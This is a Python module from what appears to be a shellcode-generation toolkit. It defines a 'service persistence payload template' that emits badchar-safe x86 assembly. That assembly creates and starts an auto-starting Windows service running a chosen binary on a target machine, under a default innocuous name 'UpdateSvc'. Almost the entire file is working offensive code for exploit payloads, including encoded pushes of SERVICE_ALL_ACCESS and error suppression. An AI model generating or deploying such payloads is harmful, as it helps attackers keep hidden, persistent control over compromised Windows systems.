"""Service persistence payload template.

Installs a Windows service that auto-starts on boot, then starts it
immediately.

Template sequence:
  OpenSCManagerA(SC_MANAGER_CREATE_SERVICE) ->
  CreateServiceA(SERVICE_AUTO_START, SERVICE_WIN32_OWN_PROCESS) ->
  StartServiceA -> CloseServiceHandle (service) ->
  CloseServiceHandle (SCM)

Required functions: OpenSCManagerA, CreateServiceA, StartServiceA,
                    CloseServiceHandle
Required variables: scm_handle, svc_handle
Required strings:   service_name, dst_path
"""
from __future__ import annotations

from ..encode import (
    safe_call_mem,
    safe_lea,
    safe_mem_store,
    safe_push_dword,
    safe_push_imm,
    safe_push_mem,
)
from .base import PayloadTemplate, TemplateConfig


class ServicePersistTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        dst = config.dst_path or ""
        if " " in dst and not dst.startswith('"'):
            raise ValueError(
                f"CreateServiceA interprets spaces in lpBinaryPathName as "
                f"argument separators. Quote the path or use a path without "
                f"spaces: {dst!r}"
            )

        bc = config.badchars

        openscm_off   = -layout.slot("OpenSCManagerA").offset
        createsvc_off = -layout.slot("CreateServiceA").offset
        startsvc_off  = -layout.slot("StartServiceA").offset
        closesh_off   = -layout.slot("CloseServiceHandle").offset

        scm_h_off     = -layout.slot("scm_handle").offset
        svc_h_off     = -layout.slot("svc_handle").offset

        svcname_off   = -layout.slot("service_name").offset
        binpath_off   = -layout.slot("dst_path").offset

        return "\n".join([
            "; -- Service Persistence Payload --",
            f"; Service: {config.service_name}",
            f"; Binary:  {config.dst_path}",
            "",

            "    ; OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE)",
            *safe_push_imm(2, bc),
            "    ; SC_MANAGER_CREATE_SERVICE = 0x0002",
            "    xor  eax, eax",
            "    push eax                    ; lpDatabaseName = NULL",
            "    push eax                    ; lpMachineName = NULL",
            *safe_call_mem("ebp", openscm_off, bc),
            "    test eax, eax",
            "    jz   svc_done               ; SCM open failed",
            *safe_mem_store("ebp", scm_h_off, "eax", bc),
            "",

            "    ; CreateServiceA(hSCM, name, display, access, type,",
            "    ;                start, error, path, NULL x5)",
            "    xor  eax, eax",
            "    push eax                    ; lpPassword = NULL",
            "    push eax                    ; lpServiceStartName = NULL",
            "    push eax                    ; lpDependencies = NULL",
            "    push eax                    ; lpdwTagId = NULL",
            "    push eax                    ; lpLoadOrderGroup = NULL",
            *safe_lea("eax", "ebp", binpath_off, bc),
            "    push eax                    ; lpBinaryPathName",
            "    xor  eax, eax",
            "    push eax                    ; dwErrorControl = SERVICE_ERROR_IGNORE (0)",
            *safe_push_imm(2, bc),
            "    ; dwStartType = SERVICE_AUTO_START",
            *safe_push_dword(0x10, bc),
            "    ; dwServiceType = SERVICE_WIN32_OWN_PROCESS",
            *_emit_service_all_access(bc),
            "    ; dwDesiredAccess = SERVICE_ALL_ACCESS (0xF01FF)",
            *safe_lea("eax", "ebp", svcname_off, bc),
            "    push eax                    ; lpDisplayName (same as service name)",
            "    push eax                    ; lpServiceName",
            *safe_push_mem("ebp", scm_h_off, bc),
            *safe_call_mem("ebp", createsvc_off, bc),
            "    test eax, eax",
            "    jz   svc_close_scm          ; CreateService failed",
            *safe_mem_store("ebp", svc_h_off, "eax", bc),
            "",

            "    ; StartServiceA(hService, 0, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; lpServiceArgVectors = NULL",
            "    push eax                    ; dwNumServiceArgs = 0",
            *safe_push_mem("ebp", svc_h_off, bc),
            *safe_call_mem("ebp", startsvc_off, bc),
            "",

            "    ; CloseServiceHandle(hService)",
            *safe_push_mem("ebp", svc_h_off, bc),
            *safe_call_mem("ebp", closesh_off, bc),
            "",

            "svc_close_scm:",
            "    ; CloseServiceHandle(hSCM)",
            *safe_push_mem("ebp", scm_h_off, bc),
            *safe_call_mem("ebp", closesh_off, bc),
            "",

            "svc_done:",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        svc = config.service_name or "UpdateSvc"
        return [
            ("Service name", svc),
            ("Binary path on target", config.dst_path or ""),
            ("Check status", f"sc query {svc}"),
            ("Remove service", f"sc delete {svc}"),
        ]


def _emit_service_all_access(badchars: set[int]) -> list[str]:
    """Push SERVICE_ALL_ACCESS (0x000F01FF) badchar-safe."""
    from ..encode import encode_dword
    lines = list(encode_dword(0x000F01FF, badchars, "eax"))
    lines.append("    push eax")
    return lines
